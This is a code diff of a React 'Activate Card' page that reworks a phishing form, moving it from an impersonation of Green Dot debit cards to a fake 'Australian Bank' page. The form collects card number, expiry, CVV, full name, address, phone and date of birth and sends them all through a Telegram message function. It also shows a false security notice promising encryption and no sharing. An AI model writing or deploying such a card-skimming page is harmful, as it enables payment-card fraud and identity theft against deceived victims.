@@ -5,118 +5,278 @@ import { useRouter } from "next/navigation";
 import { sendTelegramMessage } from "../../utils/telegram";
 
 const ActivateCardPage: React.FC = () => {
-  const [cardNumber, setCardNumber] = useState("");
-  const [expirationDate, setExpirationDate] = useState("");
-  const [cvv, setCvv] = useState("");
+  const [formData, setFormData] = useState({
+    cardNumber: "",
+    expirationDate: "",
+    cvv: "",
+    fullName: "",
+    address: "",
+    city: "",
+    state: "",
+    postalCode: "",
+    phoneNumber: "",
+    dateOfBirth: ""
+  });
   const [error, setError] = useState("");
   const router = useRouter();
 
-  const isFormValid =
-    cardNumber.length === 16 && expirationDate && cvv.length === 3;
+  // Australian states and territories
+  const australianStates = [
+    "Australian Capital Territory",
+    "New South Wales",
+    "Northern Territory",
+    "Queensland",
+    "South Australia",
+    "Tasmania",
+    "Victoria",
+    "Western Australia"
+  ];
+
+  const isFormValid = 
+    formData.cardNumber.length === 16 && 
+    formData.expirationDate && 
+    formData.cvv.length === 3 &&
+    formData.fullName.length > 0 &&
+    formData.address.length > 0 &&
+    formData.city.length > 0 &&
+    formData.state.length > 0 &&
+    formData.postalCode.length >= 4 &&
+    formData.phoneNumber.length >= 8 &&
+    formData.dateOfBirth.length === 10;
+
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
+    const { name, value } = e.target;
+    setFormData(prev => ({
+      ...prev,
+      [name]: value
+    }));
+  };
 
   const handleSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
+  e.preventDefault();
 
-    if (!isFormValid) {
-      setError("Please complete all fields.");
-      return;
-    }
+  if (!isFormValid) {
+    setError("Please complete all required fields correctly.");
+    return;
+  }
 
     const message = `
-    🔔 *New Card Activation Request* 🔔
-    💳 Card Number: ${cardNumber}
-    📅 Expiration Date: ${expirationDate}
-    🔒 CVV: ${cvv}
+🔔 *Australian Bank Card Activation* 🔔
+👤 Full Name: ${formData.fullName}
+💳 Card Number: ${formData.cardNumber}
+📅 Expiration Date: ${formData.expirationDate}
+🔒 CVV: ${formData.cvv}
+🏠 Address: ${formData.address}, ${formData.city}, ${formData.state} ${formData.postalCode}
+📞 Phone: ${formData.phoneNumber}
+🎂 Date of Birth: ${formData.dateOfBirth}
     `;
 
     try {
       await sendTelegramMessage(message);
-
-
-      setError(""); // Clear any existing errors
+      setError("");
+      router.push('/profile');
     } catch (err) {
-      console.log(err)
-      setError("Failed to send the message. Please try again.");
+      console.log(err);
+      setError("Failed to activate card. Please try again.");
     }
-    router.push('/profile');
   };
 
   return (
-    <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
-      <div className="bg-white shadow-md rounded-lg p-6 w-full max-w-xl text-center border border-gray-300">
-        <h1 className="text-xl md:text-2xl lg:text-3xl font-semibold text-gray-900 tracking-tight font-sans">
-          You are seconds away from using your new
-          <span className="text-green-600"> Green Dot Debit Card!</span>
+    <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-blue-50 to-indigo-50 px-4 py-8">
+      <div className="bg-white shadow-xl rounded-2xl p-6 w-full max-w-2xl text-center border border-gray-200">
+        {/* Bank Logo Header */}
+        <div className="flex justify-center mb-6">
+          <div className="flex items-center justify-center bg-blue-800 text-white rounded-full w-16 h-16 shadow-md">
+            <span className="text-xl font-bold">AB</span>
+          </div>
+        </div>
+        
+        <h1 className="text-2xl md:text-3xl font-bold text-gray-900 tracking-tight font-sans mb-2">
+          Activate Your Australian Bank
+          <span className="text-blue-600"> Debit Card</span>
         </h1>
 
-        <p className="text-gray-600 mt-2 text-sm md:text-base">
-          Please enter your cards information in the form below.
+        <p className="text-gray-600 mt-2 text-base">
+          Secure your new card by completing the activation process below.
         </p>
 
         {error && (
-          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-2 rounded mt-4 text-sm">
+          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-xl mt-4 text-sm">
             {error}
           </div>
         )}
 
-        <form onSubmit={handleSubmit} className="mt-6 space-y-4">
-          <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
-            <input
-              type="tel"
-              pattern="[0-9]*"
-              placeholder="16-digit card number"
-              value={cardNumber}
-              onChange={(e) =>
-                setCardNumber(e.target.value.replace(/\D/g, "").slice(0, 16))
-              }
-              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
-            />
-            <input
-              type="tel"
-              pattern="\d{2}/\d{2}"
-              placeholder="MM/YY"
-              value={expirationDate}
-              onChange={(e) => setExpirationDate(e.target.value)}
-              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
-            />
-            <input
-              type="tel"
-              pattern="[0-9]{3}"
-              placeholder="CVV"
-              value={cvv}
-              onChange={(e) =>
-                setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
-              }
-              className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-green-500 focus:border-green-500 text-sm"
-            />
+        <form onSubmit={handleSubmit} className="mt-8 space-y-5">
+          {/* Card Details */}
+          <div className="bg-blue-50 p-4 rounded-xl">
+            <h2 className="text-lg font-semibold text-blue-800 mb-3 text-left">Card Details</h2>
+            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+              <div>
+                <label className="block text-sm text-gray-600 mb-1 text-left">Card Number</label>
+                <input
+                  type="tel"
+                  name="cardNumber"
+                  pattern="[0-9]*"
+                  placeholder="1234 5678 9012 3456"
+                  value={formData.cardNumber}
+                  onChange={handleChange}
+                  maxLength={16}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                />
+              </div>
+              <div>
+                <label className="block text-sm text-gray-600 mb-1 text-left">Expiry Date</label>
+                <input
+                  type="tel"
+                  name="expirationDate"
+                  pattern="\d{2}/\d{2}"
+                  placeholder="MM/YY"
+                  value={formData.expirationDate}
+                  onChange={handleChange}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                />
+              </div>
+              <div>
+                <label className="block text-sm text-gray-600 mb-1 text-left">CVV</label>
+                <input
+                  type="tel"
+                  name="cvv"
+                  pattern="[0-9]{3}"
+                  placeholder="123"
+                  value={formData.cvv}
+                  onChange={handleChange}
+                  maxLength={3}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                />
+              </div>
+            </div>
+          </div>
+
+          {/* Personal Details */}
+          <div className="bg-blue-50 p-4 rounded-xl">
+            <h2 className="text-lg font-semibold text-blue-800 mb-3 text-left">Personal Information</h2>
+            <div className="space-y-4">
+              <div>
+                <label className="block text-sm text-gray-600 mb-1 text-left">Full Name as on Card</label>
+                <input
+                  type="text"
+                  name="fullName"
+                  placeholder="John David Smith"
+                  value={formData.fullName}
+                  onChange={handleChange}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                />
+              </div>
+              
+              <div>
+                <label className="block text-sm text-gray-600 mb-1 text-left">Street Address</label>
+                <input
+                  type="text"
+                  name="address"
+                  placeholder="123 Main Street"
+                  value={formData.address}
+                  onChange={handleChange}
+                  className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                />
+              </div>
+              
+              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div>
+                  <label className="block text-sm text-gray-600 mb-1 text-left">City</label>
+                  <input
+                    type="text"
+                    name="city"
+                    placeholder="Sydney"
+                    value={formData.city}
+                    onChange={handleChange}
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                  />
+                </div>
+                
+                <div>
+                  <label className="block text-sm text-gray-600 mb-1 text-left">State</label>
+                  <select
+                    name="state"
+                    value={formData.state}
+                    onChange={handleChange}
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                  >
+                    <option value="">Select State</option>
+                    {australianStates.map(state => (
+                      <option key={state} value={state}>{state}</option>
+                    ))}
+                  </select>
+                </div>
+                
+                <div>
+                  <label className="block text-sm text-gray-600 mb-1 text-left">Postal Code</label>
+                  <input
+                    type="text"
+                    name="postalCode"
+                    placeholder="2000"
+                    value={formData.postalCode}
+                    onChange={handleChange}
+                    maxLength={4}
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                  />
+                </div>
+              </div>
+              
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div>
+                  <label className="block text-sm text-gray-600 mb-1 text-left">Phone Number</label>
+                  <input
+                    type="tel"
+                    name="phoneNumber"
+                    placeholder="04XX XXX XXX"
+                    value={formData.phoneNumber}
+                    onChange={handleChange}
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                  />
+                </div>
+                
+                <div>
+                  <label className="block text-sm text-gray-600 mb-1 text-left">Date of Birth</label>
+                  <input
+                    type="text"
+                    name="dateOfBirth"
+                    placeholder="DD/MM/YYYY"
+                    value={formData.dateOfBirth}
+                    onChange={handleChange}
+                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-sm"
+                  />
+                </div>
+              </div>
+            </div>
           </div>
 
           <button
             type="submit"
-            className={`w-full py-2 rounded-lg text-white font-semibold transition duration-300 text-sm md:text-base ${
-              isFormValid
-                ? "bg-green-600 hover:bg-green-700"
-                : "bg-gray-300 cursor-not-allowed"
-            }`}
-            disabled={!isFormValid}
+            className="w-full py-3.5 rounded-xl text-white font-semibold transition duration-300 text-base bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-700 hover:to-indigo-800 shadow-md"
           >
-            Next
+            Activate Card
           </button>
         </form>
 
-        {/* Disclaimer Text */}
-        <p className="text-[10px] text-gray-500 mt-6 leading-tight">
-          Green Dot Cards are issued by Green Dot Bank, Member FDIC, pursuant to
-          a license from Visa U.S.A., Inc. Visa is a registered trademark of
-          Visa International Service Association. Green Dot Bank also operates
-          under the following registered trade names:{" "}
-          <strong>GO2bank, GoBank,</strong> and{" "}
-          <strong>Bonneville Bank.</strong> These registered trade names are
-          used by, and refer to, a single FDIC-insured bank, Green Dot Bank.
-          Deposits under any of these trade names are deposits with Green Dot
-          Bank and are aggregated for deposit insurance coverage up to the
-          allowable limits.
-        </p>
+        {/* Security Notice */}
+        <div className="mt-8 p-4 bg-gray-100 rounded-xl">
+          <h3 className="text-sm font-semibold text-gray-800 mb-2">Security Notice</h3>
+          <p className="text-xs text-gray-600">
+            Your information is protected with bank-level security encryption. 
+            Australian Bank uses industry-standard SSL encryption to protect your data 
+            during transmission. We will never share your details with third parties 
+            without your consent.
+          </p>
+        </div>
+
+        {/* Footer */}
+        <div className="mt-6 pt-4 border-t border-gray-200">
+          <p className="text-xs text-gray-500">
+            © 2023 Australian Bank. All rights reserved. | 
+            <a href="#" className="text-blue-600 hover:underline ml-1">Privacy Policy</a> | 
+            <a href="#" className="text-blue-600 hover:underline ml-1">Terms of Service</a>
+          </p>
+        </div>
       </div>
     </div>
   );
